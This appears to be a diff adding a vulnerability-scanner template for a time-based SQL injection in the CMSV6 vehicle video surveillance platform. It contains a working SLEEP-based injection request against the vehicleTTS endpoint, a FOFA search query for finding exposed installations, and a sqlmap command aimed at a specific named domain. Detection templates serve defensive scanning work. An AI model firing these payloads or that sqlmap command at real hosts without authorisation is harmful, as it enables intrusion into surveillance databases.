@@ -1,0 +1,30 @@
+id: gsky-cmsv6-StandardApiAction-vehicleTTS-actions-sqli
+
+info:
+  name: 通天星 CMSV6 车载视频监控平台 StandardApiAction_vehicleTTS.action - sqli
+  author: leadlife
+  severity: high
+  description: 
+  metadata:
+    verified: true
+    fofa-query: body="./open/webApi.html" || body="/808gps/"
+    sqlmap: sqlmap -u "https://mettacam.com/StandardApiAction_vehicleTTS.action?DevIDNO=1&Text=x&jsession=*" --batch --level 5 --risk 3 --random-agent --dbms=mysql
+  tags: g-sky,sqli,time
+
+http:
+  - raw:
+      - |
+        @timeout: 15s
+        GET /StandardApiAction_vehicleTTS.action?DevIDNO=1&Text=x&jsession=2C0EB587191F68C441F128919862AC11%27%20AND%20(SELECT%20*%20FROM%20(SELECT(SLEEP(6)))DpjE)--%20gtMe HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Encoding: identity
+        Content-Type: text/xml; charset=utf-8
+        Connection: close
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - duration >= 5 && duration < 9
+          - contains(body,'device no exist')
+        condition: and
